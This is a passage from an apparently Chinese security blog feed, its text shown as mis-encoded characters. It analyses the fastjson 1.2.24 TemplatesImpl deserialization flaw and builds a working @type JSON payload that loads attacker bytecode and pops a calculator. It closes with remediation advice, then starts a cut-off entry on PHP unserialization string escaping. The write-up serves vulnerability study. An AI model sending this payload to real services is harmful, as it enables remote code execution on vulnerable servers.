ï¼Œæ˜¯ç”±äºTemplatesImplç»§æ‰¿ClassLoaderå¹¶é‡å†™äº†defineClassæ–¹æ³•æ‹¥æœ‰äº†ç±»åŠ è½½å™¨çš„èƒ½åŠ›ã€‚</p><p>javaçš„ç±»åŠ è½½å™¨æ˜¯ClassLoaderï¼Œä¸»è¦ç”¨äºåŠ è½½.classå­—èŠ‚ç æ–‡ä»¶çš„ç±»åˆ°å†…å­˜ã€‚å…¶ä½¿ç”¨çš„ä¸»è¦æˆå‘˜æ–¹æ³•æ˜¯findLoadedClass()ã€loadClass()ã€findClass()ã€defineClass()ï¼Œä½¿ç”¨ä¼ªä»£ç è¡¨ç¤ºå¤§æ¦‚å…³ç³»ï¼š</p><pre><code>public abstract class ClassLoader &#123;public Class&lt;?&gt; loadClass(String name)&#123;// æŸ¥æ‰¾è¿™ä¸ªç±»æ˜¯å¦å·²ç»åŠ è½½äº†        Class&lt;?&gt; cls = findLoadedClass(name);if (cls == null) &#123;// ä½¿ç”¨çˆ¶åŠ è½½å™¨å°è¯•åŠ è½½ç±»            cls = parent.loadClass(name);// çˆ¶åŠ è½½å™¨åŠ è½½å¤±è´¥ï¼Œè¯´æ˜æ˜¯å¤–éƒ¨è‡ªå®šä¹‰ç±»ï¼Œè°ƒç”¨findClassåŠ è½½å­—èŠ‚ç çš„ç±»if (cls == null) &#123;                cls = findClass(name);            &#125;        &#125;return cls;    &#125;protected Class&lt;?&gt; findClass(String name)&#123;        Class cls = null; // è¯»å–å‘½åç©ºé—´çš„classå­—èŠ‚ç         String classPath = dirPath + &quot;/&quot; + name.replace(&#39;.&#39;, &#39;/&#39;) + &quot;.class&quot;;        byte[] data = getClassFileBytes(classPath);// ä½¿ç”¨defineClassæ–¹æ³•åŠ è½½å­—èŠ‚ç ï¼Œè¿”å›ç±»        cls = defineClass(name, data, 0, data.length);return cls;    &#125;&#125;</code></pre><h5 id="2ã€-é‡å†™ClassLoaderï¼Œè¯»å–å­—èŠ‚ç ï¼ŒåŠ è½½ç±»"><a href="#2ã€-é‡å†™ClassLoaderï¼Œè¯»å–å­—èŠ‚ç ï¼ŒåŠ è½½ç±»" class="headerlink" title="2ã€ é‡å†™ClassLoaderï¼Œè¯»å–å­—èŠ‚ç ï¼ŒåŠ è½½ç±»"></a>2ã€ é‡å†™ClassLoaderï¼Œè¯»å–å­—èŠ‚ç ï¼ŒåŠ è½½ç±»</h5><p>æˆ‘åœ¨å¤–éƒ¨æ–‡ä»¶é‡å†™äº†ClassLoaderå»åŠ è½½ã€è¿è¡Œä¸Šæ–‡payloadçš„EvilClass.classå­—èŠ‚ç ï¼Œå¼¹å‡ºè®¡ç®—å™¨ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><pre><code>CustomClassLoader.javapackage org.example;import java.io.ByteArrayOutputStream;import java.io.FileInputStream;import java.io.IOException;import java.nio.ByteBuffer;import java.nio.channels.Channels;import java.nio.channels.FileChannel;import java.nio.channels.WritableByteChannel;public class CustomClassLoader extends ClassLoader &#123;private String dirPath;public CustomClassLoader(String dirPath) &#123;this.dirPath = dirPath;    &#125;public CustomClassLoader(ClassLoader parent, String dirPath) &#123;super(parent);this.dirPath = dirPath;    &#125;@Overridepublic Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;// æŸ¥æ‰¾è¿™ä¸ªç±»æ˜¯å¦åŠ è½½äº†        Class&lt;?&gt; cls = findLoadedClass(name);if (cls == null) &#123;// è·å–åˆ°çˆ¶åŠ è½½å™¨            ClassLoader parent = this.getParent();try &#123;// å§”æ´¾ç»™çˆ¶åŠ è½½å™¨åŠ è½½                cls = parent.loadClass(name);            &#125; catch (ClassNotFoundException e) &#123;//                ignore            &#125;if (cls == null) &#123;                cls = findClass(name);            &#125;        &#125;return cls;    &#125;@Overrideprotected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;        Class cls = null;try &#123;            String classPath = dirPath + &quot;/&quot; + name.replace(&#39;.&#39;, &#39;/&#39;) + &quot;.class&quot;;byte[] data = getClassFileBytes(classPath);if (data == null) &#123;throw new ClassNotFoundException();            &#125;            cls = defineClass(name, data, 0, data.length);if (cls == null) &#123;throw new ClassFormatError();            &#125;        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;return cls;    &#125;private byte[] getClassFileBytes(String classFile) throws IOException, IOException &#123;        FileInputStream fis = new FileInputStream(classFile);        FileChannel fileChannel = fis.getChannel();        ByteArrayOutputStream baos = new ByteArrayOutputStream();        WritableByteChannel outC = Channels.newChannel(baos);        ByteBuffer buffer = ByteBuffer.allocateDirect(1024);while (true) &#123;int i = fileChannel.read(buffer);if (i == 0 || i == -1) &#123;break;            &#125;            buffer.flip();            outC.write(buffer);            buffer.clear();        &#125;        fis.close();return baos.toByteArray();    &#125;public static void main(String[] args)&#123;        String dirPath = &quot;C:\\Users\\ranja\\Desktop\\å·¥ä½œä»»åŠ¡\\javaComponentTestDemo\\src\\main\\java&quot;; // æ›¿æ¢ä¸ºä½ çš„ç›®å½•è·¯å¾„        String className = &quot;org.example.EvilClass&quot;; // æ›¿æ¢ä¸ºä½ çš„ç±»å        CustomClassLoader customClassLoader = new CustomClassLoader(dirPath);try &#123;            Class&lt;?&gt; cls = customClassLoader.loadClass(className);// ä½¿ç”¨åŠ è½½çš„ç±»è¿›è¡Œæ“ä½œ            Object obj = cls.getDeclaredConstructor().newInstance(); // å®ä¾‹åŒ–ç±»å¯¹è±¡        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p>è¿è¡Œåå¼¹å‡ºè®¡ç®—å™¨ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-12-36-31.png" alt="2024-04-14-12-36-31"></p><h5 id="3ã€TemplatesImplé‡å†™defineClassæ–¹æ³•"><a href="#3ã€TemplatesImplé‡å†™defineClassæ–¹æ³•" class="headerlink" title="3ã€TemplatesImplé‡å†™defineClassæ–¹æ³•"></a>3ã€TemplatesImplé‡å†™defineClassæ–¹æ³•</h5><p>åœ¨com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.javaé‡å†™äº†ClassLoaderï¼Œå¦‚ä¸‹ï¼š</p><pre><code>static final class TransletClassLoader extends ClassLoader &#123;private final Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;    TransletClassLoader(ClassLoader parent) &#123;super(parent);        _loadedExternalExtensionFunctions = null;    &#125;    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;super(parent);        _loadedExternalExtensionFunctions = mapEF;    &#125;public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;        Class&lt;?&gt; ret = null;// The _loadedExternalExtensionFunctions will be empty when the// SecurityManager is not set and the FSP is turned offif (_loadedExternalExtensionFunctions != null) &#123;            ret = _loadedExternalExtensionFunctions.get(name);        &#125;if (ret == null) &#123;            ret = super.loadClass(name);        &#125;return ret;    &#125;/**    * Access to final protected superclass member from outer class.    */Class defineClass(final byte[] b) &#123;return defineClass(null, b, 0, b.length);    &#125;&#125;</code></pre><p>å¯¹ç”¨äºåŠ è½½å­—èŠ‚ç åŠŸèƒ½çš„defineClassæ–¹æ³•çš„é‡å†™æœªæ ‡æ˜è®¿é—®ä¿®é¥°ç¬¦ï¼Œä½¿å¾—è¯¥æ–¹æ³•çš„è®¿é—®æƒé™æ˜¯defaultï¼Œå¯ä»¥è¢«åŒåŒ…çš„å…¶ä»–ç±»è®¿é—®ï¼Œè¿™æ˜¯è°ƒç”¨é“¾æœ€åº•å±‚çš„å¼€å§‹ã€‚</p><p>å›åˆ°com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.javaç¬¬455è¡Œï¼Œçœ‹defineClassä¹‹å¤–ï¼Œä»£ç å¯¹ç±»ååºåˆ—åŒ–çš„å¤„ç†ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-12-37-19.png" alt="2024-04-14-12-37-19"></p><p>å¯ä»¥çœ‹åˆ°é™åˆ¶äº†ååºåˆ—åŒ–çš„ç±»å‹ä¸ºAbstractTransletï¼Œè·Ÿè¿›è¯¥ç±»å‹ï¼Œå¦‚ä¸‹ï¼š</p><pre><code>public abstract class AbstractTranslet implements Translet</code></pre><p>å¯çŸ¥ååºåˆ—åŒ–é™åˆ¶ç±»å‹ä¸ºAbstractTransletçš„å­ç±»ã€‚</p><h5 id="4ã€è°ƒç”¨é“¾å‘ç°"><a href="#4ã€è°ƒç”¨é“¾å‘ç°" class="headerlink" title="4ã€è°ƒç”¨é“¾å‘ç°"></a>4ã€è°ƒç”¨é“¾å‘ç°</h5><p>å¯¹defineClassæŒ‰ä¸‹Alt+F7ï¼ˆæŸ¥æ‰¾ç”¨æ³•ï¼‰ï¼Œæ‰¾åˆ°defineTransletClasses()ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-12-37-45.png" alt="2024-04-14-12-37-45"></p><p>å¯¹defineTransletClasses()ç»§ç»­è·Ÿè¿›â€œæŸ¥æ‰¾ç”¨æ³•â€ï¼Œå‘ç°ä¸‰å¤„è°ƒç”¨ï¼š</p><pre><code>public synchronized int getTransletIndex()private synchronized Class[] getTransletClasses()private Translet getTransletInstance()</code></pre><p>å¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-12-38-25.png" alt="2024-04-14-12-38-25"></p><p>æœ¬æ–‡ä»…åˆ†æå…¶ä¸­çš„private Translet getTransletInstance()è¿™æ¡é“¾ã€‚åœ¨getTransletInstance()è¦è°ƒç”¨åˆ°defineTransletClasses()ï¼Œéœ€è¦æ»¡è¶³_nameä¸ä¸ºnullä¸”_classæ˜¯nullçš„æ¡ä»¶ã€‚å¦‚å›¾ï¼š</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-13-13-30.png" alt="2024-04-14-13-13-30"></p><p>å¯¹getTransletInstance()æŸ¥æ‰¾ç”¨æ³•ï¼Œè·Ÿè¿›åˆ°public synchronized Transformer newTransformer()ï¼Œå¦‚å›¾ï¼š</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-13-14-06.png" alt="2024-04-14-13-14-06"></p><p>å¯¹newTransformer()æŸ¥æ‰¾ç”¨æ³•ï¼Œä¼šå‘ç°å¤šä¸ªè°ƒç”¨ç»“æœï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-13-14-32.png" alt="2024-04-14-13-14-32"></p><h5 id="5ã€æ‰¾newTransformer-çš„æ­£ç¡®è°ƒç”¨è·¯å¾„ï¼Œè¿‡æ»¤ç»“æœ"><a href="#5ã€æ‰¾newTransformer-çš„æ­£ç¡®è°ƒç”¨è·¯å¾„ï¼Œè¿‡æ»¤ç»“æœ" class="headerlink" title="5ã€æ‰¾newTransformer()çš„æ­£ç¡®è°ƒç”¨è·¯å¾„ï¼Œè¿‡æ»¤ç»“æœ"></a>5ã€æ‰¾newTransformer()çš„æ­£ç¡®è°ƒç”¨è·¯å¾„ï¼Œè¿‡æ»¤ç»“æœ</h5><p>newTransformer()æ˜¯æ¥å£ç±»å‹çš„å®ç°ï¼Œä½†æ˜¯IDEAæŠŠå…¶ä»–çš„åŒåæ¥å£çš„â€œå®ç°è¢«è°ƒç”¨â€ä¹Ÿå½“ä½œâ€œç”¨æ³•æŸ¥æ‰¾â€çš„ç»“æœäº†ã€‚éœ€è¦é€ä¸ªè·Ÿè¿›éªŒè¯ï¼Œç¡®è®¤è¿™6ä¸ªè·¯å¾„æ˜¯å¦è§¦å‘newTransformer()ã€‚</p><p>newTransformer()æ¥å£å®šä¹‰åœ¨javax/xml/transform/Templates.javaï¼Œéƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š</p><pre><code>public interface Templates &#123;Transformer newTransformer() throws TransformerConfigurationException;</code></pre><p>æ¥ä¸‹æ¥çš„è¿‡æ»¤æ–¹æ³•ï¼Œå°±æ˜¯ä¾æ¬¡çœ‹IDEAè¿”å›çš„ç»“æœï¼Œçœ‹é‚£å¤„çš„Templatesçš„å®ç°å’ŒnewTransformer()çš„å®ç°æ˜¯ä¸æ˜¯è°ƒç”¨getTransletInstance()ï¼Œä½œä¸ºè¿‡æ»¤çš„æ ‡å‡†ã€‚</p><p>æ¯”å¦‚ï¼Œå¯¹ç¬¬ä¸€ä¸ªç»“æœè¿›è¡Œåˆ†æï¼Œå¦‚å›¾ï¼š</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-13-15-26.png" alt="2024-04-14-13-15-26"></p><p>çœ‹åˆ°stylesheetï¼ˆå³interface Templatesï¼‰æ˜¯tfactory.newTemplates(source)æ¥å®ç°ï¼Œè·Ÿè¿›newTemplates(source)éƒ¨åˆ†ï¼Œå‘ç°ä»…è¿”å›ä¸€ä¸ªæŠ½è±¡ç±»å‹çš„æ¥å£ç±»å‹ï¼ˆTemplatesä¸Šæ–‡å·²æåˆ°æ˜¯ä¸€ä¸ªæ¥å£ï¼‰ï¼Œå¦‚ä¸‹ï¼š</p><pre><code>public abstract Templates newTemplates(Source source)throws TransformerConfigurationException;</code></pre><p>é‚£ç»§ç»­è·Ÿè¿›tfactoryç±»å‹ï¼Œçœ‹å…¶å¯¹newTemplatesæ¥å£çš„å®ç°éƒ¨åˆ†çš„ä»£ç ã€‚è·Ÿè¿›åæœªå‘ç°å…¶é‡å†™newTemplates()ï¼Œè¯´æ˜è¯¥æ¡ä½œä¸ºâ€œè§¦å‘newTransformer()â€çš„â€œæŸ¥æ‰¾ç”¨æ³•â€çš„ç»“æœï¼Œä¸æ˜¯æˆ‘ä»¬æœŸæœ›çš„ã€‚</p><p>ä½¿ç”¨æ ¹æ®ä¸Šä¸‹æ–‡æ¥å£å®ç°çš„æ–¹æ³•ï¼Œå¯ä»¥ä¾æ¬¡æ’é™¤å¦å¤–4ä¸ªäºæˆ‘ä»¬è€Œè¨€çš„éæœŸæœ›ç»“æœï¼ˆå‡æœªæ‰§è¡Œåˆ°æˆ‘ä»¬æœŸæœ›çš„Transformer()æ¥å£çš„ä»£ç ï¼‰ï¼Œæœ€ç»ˆæˆ‘ä»¬è·Ÿè¿›getOutputProperties()ï¼Œå¦‚å›¾ï¼š</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-13-15-53.png" alt="2024-04-14-13-15-53"></p><p>ç»è¿‡ç®€å•çš„æ­¥å…¥è°ƒè¯•ï¼Œç¡®è®¤getOutputProperties()ä¼šæ‰§è¡Œåˆ°æœŸæœ›çš„Transformer()æ¥å£å®ç°ã€‚ç»“åˆfastjsonçš„ååºåˆ—åŒ–ç‰¹æ€§ï¼ŒgetOutputProperties()å°†ä¼šæˆä¸ºPOCå…¥å£ã€‚</p><h3 id="4-2-fastjsonä¸ºä»€ä¹ˆéœ€è¦ä½¿ç”¨-typeé”®è§¦å‘"><a href="#4-2-fastjsonä¸ºä»€ä¹ˆéœ€è¦ä½¿ç”¨-typeé”®è§¦å‘" class="headerlink" title="4.2 fastjsonä¸ºä»€ä¹ˆéœ€è¦ä½¿ç”¨@typeé”®è§¦å‘"></a>4.2 fastjsonä¸ºä»€ä¹ˆéœ€è¦ä½¿ç”¨@typeé”®è§¦å‘</h3><p>æŠŠfastjsonä»£ç cloneä¸‹æ¥ï¼Œç‰ˆæœ¬å›é€€åï¼Œæ–°å»ºäº†Baduserç±»å’ŒMainç±»ï¼Œç”¨ä½œè°ƒç”¨fastjsonçš„ç¨‹åºå…¥å£ã€‚</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-13-16-31.png" alt="2024-04-14-13-16-31"></p><p>æ­¥å…¥ä»£ç è·Ÿè¿›ï¼Œcom/alibaba/fastjson/parser/DefaultJSONParser.javaçš„325è¡Œï¼Œä»£ç å¦‚ä¸‹ï¼š</p><pre><code>if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123; String typeName = lexer.scanSymbol(symbolTable, &#39;&quot;&#39;);    Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</code></pre><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°JSON.DEFAULT_TYPE_KEYï¼Œå…¶åœ¨com/alibaba/fastjson/JSON.javaè¿›è¡Œäº†å®šä¹‰ï¼š</p><pre><code>public abstract class JSON implements JSONStreamAware, JSONAware &#123;    â€¦public static String           DEFAULT_TYPE_KEY     = &quot;@type&quot;;</code></pre><p>å†çœ‹ä¸Šä¸€æ®µä»£ç ä¸­æ»¡è¶³key==â€@typeâ€çš„ifé€»è¾‘ï¼Œä¼šè§¦å‘å¦‚ä¸‹ä»£ç ï¼š</p><pre><code>Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</code></pre><p>æ­¤å¤„çš„loadClassç±»ä¼¼ä¸Šæ–‡æåˆ°çš„ç±»åŠ è½½å™¨ï¼Œæ­¤å¤„fastjsonäº¦æœ‰ä¸åŒç¨‹åº¦çš„ç»§æ‰¿å’Œæ”¹å†™ã€‚ä½¿ç”¨@typeé”®ï¼Œå¯ä»¥è‡ªè¡ŒæŒ‡å®šç±»åã€‚</p><h3 id="4-3-åˆ†æï¼šå¦‚ä½•æ„é€ payload"><a href="#4-3-åˆ†æï¼šå¦‚ä½•æ„é€ payload" class="headerlink" title="4.3 åˆ†æï¼šå¦‚ä½•æ„é€ payload"></a>4.3 åˆ†æï¼šå¦‚ä½•æ„é€ payload</h3><p>æ ¹æ®ä¸Šæ–‡æåŠæ¡ä»¶ï¼Œæ¼æ´æ„é€ åˆæ­¥æ¡ä»¶å¦‚ä¸‹ï¼š</p><pre><code>1.fastjsoné€šè¿‡@typeæŒ‡å®šååºåˆ—ç±»åï¼Œé€šè¿‡JSON.parseå’ŒJSON.parseObjectä¸¤ä¸ªè·¯å¾„å¯ä»¥è§¦å‘æ— å‚æ„é€ å‡½æ•°ã€ç§æœ‰å˜é‡çš„setã€getæ–¹æ³•ï¼›2.å¯¹äºTemplatesImplç±»ï¼Œåˆ†æè·å–çš„è°ƒç”¨é“¾é¡¶ç‚¹æ˜¯getOutputProperties()ï¼ŒTemplatesImplç±»æœ‰ç§æœ‰å˜é‡private Properties _outputProperties;3.ç¬¬1å’Œç¬¬2å·²æ»¡è¶³payloadè¿è¡Œå…¥å£ï¼Œéœ€è¦ä¼ å…¥_outputPropertiesç”¨ä»¥è§¦å‘getOutputProperties()ï¼›4.æ ¹æ®å¯¹TemplatesImpl#getTransletInstance()çš„åˆ†æï¼Œæ„é€ çš„å­—èŠ‚ç çš„ç±»å¿…é¡»æ˜¯AbstractTransletçš„å­ç±»ï¼Œä¸”éœ€è¦æ»¡è¶³_nameä¸ä¸ºnullï¼Œä¸”_classä¸ºnullï¼›</code></pre><p>é‚ä»¤_nameä¸ºénullï¼ˆç©ºå­—ç¬¦ä¸²æˆ–ä»€ä¹ˆå­—ç¬¦ä¸²å‡å¯ï¼‰ï¼Œä»¤outputPropertiesä¸º{}ï¼ˆ{}è¡¨ç¤ºJSONçš„ç©ºå¯¹è±¡ï¼Œè€Œénullï¼Œååºåˆ—åŒ–çš„å®ä¾‹å¯¹è±¡çš„è¯¥æˆå‘˜å˜é‡ä¸ºâ€œç©ºå¯¹è±¡â€è€Œénullï¼›è‹¥ä¸å†™æŸäº›ç§æœ‰å˜é‡ï¼Œåˆ™è¯¥å€¼å°†ä¸ºnullï¼‰ï¼Œä»¤_bytecodesä¸ºbyte[][]ç±»å‹ã€‚</p><p>ç”±äºæ¶‰åŠç§æœ‰å˜é‡çš„ååºåˆ—åŒ–ï¼Œåœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œéœ€è¦æºå¸¦æ”¯æŒç§æœ‰å˜é‡çš„å‚æ•°Feature.SupportNonPublicFieldï¼Œå¦‚ï¼š</p><pre><code>JSON.parseObject(payload, Feature.SupportNonPublicField);</code></pre><p>åˆæ­¥æ„é€ payloadå¦‚ä¸‹ï¼š</p><pre><code>public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;    String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;:[\&quot;&lt;EvilClass.classçš„base64ç¼–ç &gt;\&quot;], \&quot;_name\&quot;:\&quot;\&quot;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;;    JSON.parseObject(payload, Feature.SupportNonPublicField);&#125;</code></pre><p>è¿è¡Œå®Œæ¯•åï¼Œæ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨ï¼Œåªæœ‰æŠ¥é”™ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-13-19-03.png" alt="2024-04-14-13-19-03"></p><p>çœ‹åˆ°æŠ¥é”™æ˜¯set property error, outputPropertiesï¼Œç›®æµ‹æ˜¯outputPropertieså±æ€§èµ‹å€¼è¿‡ç¨‹å‡ºç°é”™è¯¯ï¼Œè·Ÿè¿›è°ƒè¯•å‘ç°é—®é¢˜ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-13-19-33.png" alt="2024-04-14-13-19-33"></p><p>ç”±äºæ²¡æœ‰ç»™_tfactoryèµ‹å€¼ï¼Œæ­¤æ—¶_tfactoryæ˜¯nullï¼Œä»£ç _tfactory.getExternalExtensionsMap()æŠ¥é”™ã€‚</p><p>è·Ÿè¿›_tfactoryï¼Œå¦‚ä¸‹ï¼š</p><pre><code>private transient TransformerFactoryImpl _tfactory = null;</code></pre><p>transientä¿®é¥°ç¬¦æ˜¯è¯´è¯¥æˆå‘˜å€¼ä¸å—åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å½±å“ï¼Œä¸ºé»˜è®¤å€¼ã€‚ä½†æ˜¯transientä¿®é¥°ç¬¦ä»…å¯¹javaè‡ªèº«çš„åºåˆ—åŒ–ååºåˆ—åŒ–æœºåˆ¶æœ‰æ•ˆï¼Œå¯¹fastjsonçš„æœºåˆ¶æ— æ•ˆã€‚æ­¤å¤„transientè¡¨ç¤ºäº†_tfactoryä»…éœ€ä»£ç å®šä¹‰çš„é»˜è®¤å€¼å³å¯ï¼Œä¿®æ”¹æ­¤å€¼å¯¹ç¨‹åºè¿è¡Œæ²¡æœ‰ç›´æ¥å½±å“ã€‚</p><p>è·Ÿè¿›TransformerFactoryImplç±»å‹ï¼Œç¡®è®¤æˆå‘˜æ–¹æ³•ä¸­å­˜åœ¨getExternalExtensionsMap()ã€‚</p><p>å› æ­¤ï¼Œæˆ‘ä»¬åœ¨payloadä¸­å¯¹_tfactoryå˜é‡ä¼ å…¥{}å³å¯ä½¿payloadçš„æ‰§è¡Œæ­£å¸¸ã€‚</p><p>payloadä¿®æ”¹å¦‚ä¸‹ï¼š</p><pre><code>public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;    String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;:[\&quot;&lt;EvilClass.classçš„base64ç¼–ç &gt;\&quot;], \&quot;_name\&quot;:\&quot;\&quot;, \&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;;    JSON.parseObject(payload, Feature.SupportNonPublicField);&#125;</code></pre><p>è¿è¡Œï¼ŒæˆåŠŸæ‰§è¡ŒPOCã€‚</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-13-20-35.png" alt="2024-04-14-13-20-35"></p><h3 id="4-4-æ¼æ´é£é™©"><a href="#4-4-æ¼æ´é£é™©" class="headerlink" title="4.4 æ¼æ´é£é™©"></a>4.4 æ¼æ´é£é™©</h3><p>æ”¹æ¼æ´åœ¨fastjsonç‰ˆæœ¬åœ¨[1.2.22, 1.2.24]ä¸­å­˜åœ¨ï¼Œå¦‚æœä»£ç ä¸­è®¾ç½®å¯¹SupportNonPublicFieldååºåˆ—åŒ–ç§æœ‰å˜é‡çš„æ”¯æŒï¼Œä¸”å­˜åœ¨fastjson.JSON.parse()æˆ–fastjson.JSON.parseObject()ç›´æ¥æ¥å—å¤–éƒ¨jsonæ•°æ®çš„æƒ…æ™¯ï¼Œè¯¥æ¥å£å­˜åœ¨é£é™©ã€‚</p><h1 id="5-å¯¹å¼€å‘å®‰å…¨çš„å¯ç¤º"><a href="#5-å¯¹å¼€å‘å®‰å…¨çš„å¯ç¤º" class="headerlink" title="5 å¯¹å¼€å‘å®‰å…¨çš„å¯ç¤º"></a>5 å¯¹å¼€å‘å®‰å…¨çš„å¯ç¤º</h1><p>æœ¬æ¬¡æ¼æ´çš„æ ¹æœ¬åŸå› æ˜¯ç”±äºTemplatesImplç±»ä¸­é‡å†™äº†classLoaderç±»ï¼Œä½†æ²¡æœ‰å†™è®¿é—®ä¿®é¥°ç¬¦é™åˆ¶ï¼Œå¯¼è‡´é‡å†™åçš„defineClassæ–¹æ³•é»˜è®¤æ˜¯defaultå±æ€§ï¼Œå¯ä»¥è¢«åŒåŒ…å…¶ä»–ç±»ã€æ–¹æ³•è®¿é—®ï¼Œäº§ç”Ÿäº†è°ƒç”¨é“¾ã€‚</p><p><em>å¯¹å¼€å‘å®‰å…¨çš„å¯ç¤ºï¼š</em></p><pre><code>1.é‡å†™classLoaderç±»å¸¸è§äºååºåˆ—åŒ–åŠŸèƒ½çš„å®ç°ï¼Œååºåˆ—åŒ–ä¼´éšç€å®‰å…¨éšæ‚£ï¼Œéœ€è¦æ…é‡å¯¹å¾…ã€‚å»ºè®®ä½¿ç”¨ä¸¥æ ¼çš„è®¿é—®ä¿®é¥°ç¬¦é™åˆ¶é‡å†™ï¼Œå‡å°è¢«éé¢„æœŸè°ƒç”¨çš„æš´éœ²é¢ï¼›2.fastjsonçš„1ç‰ˆæœ¬å®˜æ–¹å·²ä¸å†è¿›è¡Œæ”¯æŒï¼Œå»ºè®®ä½¿ç”¨fastjson2ç»„ä»¶ï¼›</code></pre>]]></content>
      
      
      <categories>
          
          <category> code-audit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Unserialization Escaping</title>
      <link href="/2022/07/09/code_audit/unserializationEscaping/"/>
      <url>/2022/07/09/code_audit/unserializationEscaping/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸">ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</a><ul><li><a href="#å°‘å˜å¤š">å°‘å˜å¤š</a><pre><code>- [å®éªŒ](#å®éªŒ)</code></pre><ul><li><a href="#åšæ³•">åšæ³•</a><ul><li><a href="#1-ç”Ÿæˆä¸€ä¸ªçœ‹èµ·æ¥æ­£å¸¸çš„åºåˆ—åŒ–å­—ç¬¦ä¸²">1 ç”Ÿæˆä¸€ä¸ªçœ‹èµ·æ¥æ­£å¸¸çš„åºåˆ—åŒ–å­—ç¬¦ä¸²</a></li><li><a href="#2-æ„é€ æœ€ç»ˆçš„passå€¼">2 æ„é€ æœ€ç»ˆçš„passå€¼</a></li><li><a href="#3-è®¡ç®—æº¢å‡ºä½ç§»æ„é€ payload">3 è®¡ç®—æº¢å‡ºä½ç§»ï¼Œæ„é€ payload</a></li></ul></li></ul></li><li><a href="#å¤šå˜å°‘">å¤šå˜å°‘</a><pre><code>- [å®éªŒä»£ç ](#å®éªŒä»£ç )</code></pre><ul><li><a href="#åšæ³•-1">åšæ³•</a><ul><li><a href="#1-ç”Ÿæˆä¸€ä¸ªçœ‹èµ·æ¥æ­£å¸¸çš„åºåˆ—åŒ–å­—ç¬¦ä¸²-1">1 ç”Ÿæˆä¸€ä¸ªçœ‹èµ·æ¥æ­£å¸¸çš„åºåˆ—åŒ–å­—ç¬¦ä¸²</a></li><li><a href="#2-è®¡ç®—è¢«åƒæ‰éƒ¨åˆ†å­—ç¬¦ä¸²">2 è®¡ç®—è¢«åƒæ‰éƒ¨åˆ†å­—ç¬¦ä¸²</a></li><li><a href="#3-æ„é€ payloadæ‹¼æ¥å°¾éƒ¨">3 æ„é€ payloadæ‹¼æ¥å°¾éƒ¨</a></li></ul></li></ul></li></ul></li></ul><h1 id="ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"><a href="#ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"></a>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</h1><h2 id="å°‘å˜å¤š"><a href="#å°‘å˜å¤š" class="headerlink" title="å°‘å˜å¤š"></a>å°‘å˜å¤š</h2><h5 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h5><pre><code>&lt;?php// å°‘å˜å¤šé¢˜ç›®function filter($str)&#123;    return str_replace(&#39;bb&#39;, &#39;ccc&#39;, $str);&#125;class A&#123;    public $name=&#39;aaaa&#39;;    public 